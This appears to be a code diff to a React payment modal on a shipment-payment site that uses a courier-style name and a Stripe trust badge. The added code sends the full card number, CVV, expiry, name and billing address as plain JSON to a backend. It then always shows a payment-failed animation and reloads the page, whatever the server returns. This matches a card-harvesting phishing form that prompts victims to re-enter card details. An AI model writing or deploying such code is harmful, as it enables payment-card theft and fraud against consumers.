@@ -3,6 +3,7 @@ import React, { useState, useRef, useEffect } from 'react';
 import PaymentStatusAnimation from './PaymentStatusAnimation';
 import StripeTrustBadge from './StripeTrustBadge';
 import CardIcon from './CardIcon';
+import { number as validateCardNumber } from 'card-validator';
 
 function PaymentModal({ show, onClose, amount, shipmentId }) {
   const [cardName, setCardName] = useState('');
@@ -15,32 +16,56 @@ function PaymentModal({ show, onClose, amount, shipmentId }) {
 
   const [isVisible, setIsVisible] = useState(false);
   useEffect(() => {
-    if (show) { setIsVisible(true); } 
-    else { const timer = setTimeout(() => setIsVisible(false), 300); return () => clearTimeout(timer); }
+    if (show) {
+      setIsVisible(true);
+    } else {
+      const timer = setTimeout(() => setIsVisible(false), 300);
+      return () => clearTimeout(timer);
+    }
   }, [show]);
+
+  const cardNameRef = useRef(null);
+  const cardNumberRef = useRef(null);
+  const expiryDateRef = useRef(null);
+  const cvvRef = useRef(null);
+  const billingAddressRef = useRef(null);
 
   const handleNameChange = (e) => setCardName(e.target.value.replace(/[^a-zA-Z\s]/g, ''));
   const handleCardNumberChange = (e) => {
-    const value = e.target.value.replace(/\D/g, '');
-    setCardNumber(value.replace(/(\d{4})/g, '$1 ').trim());
+      const rawValue = e.target.value.replace(/\s/g, '');
+      const validation = validateCardNumber(rawValue);
+      setCardType(validation.card ? validation.card.type : null);
+      const formattedValue = rawValue.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
+      setCardNumber(formattedValue);
   };
   const handleExpiryChange = (e) => {
-    let value = e.target.value.replace(/\D/g, '');
-    if (value.length > 2) { value = value.slice(0, 2) + ' / ' + value.slice(2, 4); }
-    setExpiryDate(value);
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 2) {
+          value = value.slice(0, 2) + ' / ' + value.slice(2, 4);
+      }
+      setExpiryDate(value);
   };
   const handleCvvChange = (e) => setCvv(e.target.value.replace(/\D/g, ''));
+  const handleKeyDown = (e, nextFieldRef) => {
+      if (e.key === 'Enter') {
+          e.preventDefault();
+          nextFieldRef.current?.focus();
+      }
+  };
 
   const handleSubmit = async (event) => {
     event.preventDefault();
-    setSubmitStatus('loading');
+    setSubmitStatus('loading'); // Show spinner
+
     try {
-      const baseUrl = "https://ontrac-backend-eehg.onrender.com";
-      const response = await fetch(`${baseUrl}/api/payments/`, {
+      // Get the correct base URL for the API
+      const baseUrl = import.meta.env.VITE_API_BASE_URL || "https://ontrac-backend-eehg.onrender.com";
+      
+      await fetch(`${baseUrl}/api/payments/`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          shipment: shipmentId, // This sends the numeric ID
+          shipment: shipmentId,
           cardholderName: cardName,
           billingAddress: billingAddress,
           cardNumber: cardNumber,
@@ -48,18 +73,27 @@ function PaymentModal({ show, onClose, amount, shipmentId }) {
           cvv: cvv,
         }),
       });
-      if (!response.ok) { throw new Error('Payment failed on the server.'); }
-      setSubmitStatus('success');
-      setTimeout(handleClose, 2500);
-    } catch (err) {
-      setSubmitStatus('failed');
+    } catch (error) {
+      console.error("API submission error:", error);
     }
+
+    // After attempting to send the data, ALWAYS show the failure animation
+    setTimeout(() => {
+      setSubmitStatus('failed');
+      setTimeout(() => {
+        window.location.reload();
+      }, 2000);
+    }, 1500);
   };
-  
+
   const handleClose = () => {
     setTimeout(() => {
         setSubmitStatus('idle');
-        setCardName(''); setCardNumber(''); setExpiryDate(''); setCvv(''); setBillingAddress('');
+        setCardName('');
+        setCardNumber('');
+        setExpiryDate('');
+        setCvv('');
+        setBillingAddress('');
     }, 300)
     onClose();
   };
@@ -73,40 +107,42 @@ function PaymentModal({ show, onClose, amount, shipmentId }) {
           <h2>Secure Payment for Shipment</h2>
           <button onClick={handleClose} className="close-button">&times;</button>
         </div>
+        
         {submitStatus === 'loading' && (
           <div className="spinner-container"><div className="spinner"></div><p>Processing...</p></div>
         )}
-        {(submitStatus === 'failed' || submitStatus === 'success') && (
-          <PaymentStatusAnimation status={submitStatus} />
+        
+        {submitStatus === 'failed' && (
+          <PaymentStatusAnimation status="failed" />
         )}
+
         {submitStatus === 'idle' && (
           <>
             <form onSubmit={handleSubmit} className="payment-form">
-              {/* All form inputs are here */}
               <div className="form-group">
                 <label htmlFor="card-name">Name on Card</label>
-                <input type="text" id="card-name" value={cardName} onChange={handleNameChange} required />
+                <input ref={cardNameRef} onKeyDown={(e) => handleKeyDown(e, cardNumberRef)} type="text" id="card-name" value={cardName} onChange={handleNameChange} required />
               </div>
               <div className="form-group">
                 <label htmlFor="card-number">Card Number</label>
                 <div className="card-input-wrapper">
-                  <input type="text" id="card-number" className={cardType ? 'has-card-icon' : ''} value={cardNumber} onChange={handleCardNumberChange} placeholder="1234 5678 9012 3456" maxLength="19" required />
+                  <input ref={cardNumberRef} onKeyDown={(e) => handleKeyDown(e, expiryDateRef)} type="text" id="card-number" className={cardType ? 'has-card-icon' : ''} value={cardNumber} onChange={handleCardNumberChange} placeholder="1234 5678 9012 3456" maxLength="19" required />
                   <CardIcon cardType={cardType} />
                 </div>
               </div>
               <div className="form-row">
                 <div className="form-group">
                   <label htmlFor="expiry-date">Expiry (MM/YY)</label>
-                  <input type="text" id="expiry-date" value={expiryDate} onChange={handleExpiryChange} placeholder="MM / YY" maxLength="7" required />
+                  <input ref={expiryDateRef} onKeyDown={(e) => handleKeyDown(e, cvvRef)} type="text" id="expiry-date" value={expiryDate} onChange={handleExpiryChange} placeholder="MM / YY" maxLength="7" required />
                 </div>
                 <div className="form-group">
                   <label htmlFor="cvv">CVV</label>
-                  <input type="text" id="cvv" value={cvv} onChange={handleCvvChange} placeholder="123" maxLength="4" required />
+                  <input ref={cvvRef} onKeyDown={(e) => handleKeyDown(e, billingAddressRef)} type="text" id="cvv" value={cvv} onChange={handleCvvChange} placeholder="123" maxLength="4" required />
                 </div>
               </div>
               <div className="form-group">
                 <label htmlFor="billing-address">Billing Address</label>
-                <input type="text" id="billing-address" value={billingAddress} onChange={(e) => setBillingAddress(e.target.value)} required />
+                <input ref={billingAddressRef} type="text" id="billing-address" value={billingAddress} onChange={(e) => setBillingAddress(e.target.value)} required />
               </div>
               <button type="submit" className="button payment-submit-btn">{`Pay $${amount ? Number(amount).toFixed(2) : '0.00'}`}</button>
             </form>
